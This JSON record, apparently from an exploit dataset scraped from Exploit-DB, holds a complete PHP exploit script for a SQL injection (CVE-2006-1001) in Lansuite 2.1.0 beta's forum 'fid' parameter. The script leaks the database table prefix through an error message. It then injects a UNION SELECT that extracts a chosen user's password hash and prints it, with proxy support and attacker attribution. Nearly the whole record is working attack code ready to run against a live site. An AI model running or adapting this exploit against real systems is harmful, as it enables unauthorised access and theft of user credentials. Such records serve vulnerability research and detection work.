{
  "id": "1526",
  "title": "Lansuite 2.1.0 Beta - &#039;fid&#039; SQL Injection",
  "cve": "CVE-2006-1001",
  "vuln_type": "sqli",
  "code": "<?\r\nerror_reporting(E_ERROR);\r\n\r\nfunction xss_init()\r\n{\r\n    if (!extension_loaded('php_curl'))\r\n    {\r\n       if (!dl('curl.so') and !dl('php_curl.so') and !dl('php_curl.dll'))\r\n       die (\"oo error - cannot load curl extension!\");\r\n    }\r\n}\r\n\r\nfunction xss_header()\r\n{\r\n    echo \"\\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo\";\r\n    echo \"                                  oo    ooooooo     ooooooo\\n\";\r\n    echo \"                    oooo   oooo o888  o88     888 o888   888o\\n\";\r\n    echo \"                      888o888    888        o888   888888888\\n\";\r\n    echo \"                      o88888o    888     o888   o 888o   o888\\n\";\r\n    echo \"                    o88o   o88o o888o o8888oooo88   88ooo88\\n\";\r\n    echo \"oooooooooooooooooooooo lansuite 2.10 remote sql injection oooooooooooooooooooooo\\n\";\r\n    echo \"oo usage          $ php lansuite-210-exploit.php [url] [user id]\\n\";\r\n    echo \"oo proxy support  $ php lansuite-210-exploit.php [url] [user id] [proxy]:[port]\\n\";\r\n    echo \"oo example        $ php lansuite-210-exploit.php http://localhost 1\\n\";\r\n    echo \"oo print the password of the user\\n\\n\";\r\n}\r\n\r\nfunction xss_bottom()\r\n{\r\n    echo \"\\noo developed for the [myg0t] online gaming group\\n\";\r\n    echo \"oo discover : x128 - alexander wilhelm - 24/02/2006\\n\";\r\n    echo \"oo contact  : exploit <at> x128.net                    oo website : www.x128.net\";\r\n}\r\n\r\nfunction xss_exploit()\r\n{\r\n    $xss_target = $_SERVER['argv'][1] . \"/index.php\";\r\n    $xss_http_prefix_get = \"?mod=board&action=forum&fid=x128\";\r\n\r\n    $xss_connection = curl_init();\r\n\r\n    if ($_SERVER['argv'][3])\r\n    {\r\n        curl_setopt($xss_connection, CURLOPT_TIMEOUT, 8);\r\n        curl_setopt($xss_connection, CURLOPT_PROXY, $_SERVER['argv'][3]);\r\n    }\r\n\r\n    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_prefix_get);\r\n    curl_setopt ($xss_connection, CURLOPT_HEADER, 0);\r\n    curl_setopt ($xss_connection, CURLOPT_RETURNTRANSFER, 1);\r\n    curl_setopt ($xss_connection, CURLOPT_USERAGENT, 'x128');\r\n\r\n    $xss_prefix_source = curl_exec($xss_connection) or die(\"oo error - cannot connect!\\n\");\r\n    \r\n    $xss_prefix = substr(strstr($xss_prefix_source, \"need_type FROM \"), 15, strpos(strstr($xss_prefix_source, \"need_type FROM \"), \"board_forums\") - 15);\r\n    \r\n    $xss_http_get = \"?mod=board&action=forum&fid=\" . urlencode(\"0 UNION SELECT 1, 1, 1, 1, 1, 1, password, 1, 1, 1, 1 FROM \". $xss_prefix .\"user WHERE userid = \". $_SERVER['argv'][2] .\"/*\");\r\n\r\n    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_get);\r\n\r\n    $xss_source = curl_exec($xss_connection) or die(\"oo error - cannot connect!\\n\");\r\n\r\n    $xss_passwd = substr(strstr($xss_source, \"b.userid WHERE pid = \"), 21, 32);\r\n    \r\n    if ($xss_passwd == \"\") { $xss_passwd = substr(strstr($xss_source, \"Unknown column '\"), 16, 32); }\r\n\r\n    if ($_SERVER['argv'][2] && $xss_passwd)\r\n    {\r\n        echo \"oo user           \" . $_SERVER['argv'][2] . \"\\n\";\r\n        echo \"oo password       \" . $xss_passwd . \"\\n\\n\";\r\n        echo \"oo dafaced ...\\n\";\r\n    }\r\n    curl_close ($xss_connection); \r\n}\r\n\r\nxss_init();\r\nxss_header();\r\nxss_exploit();\r\nxss_bottom();\r\n?>\r\n\r\n# milw0rm.com [2006-02-24]",
  "url": "https://www.exploit-db.com/exploits/1526"
}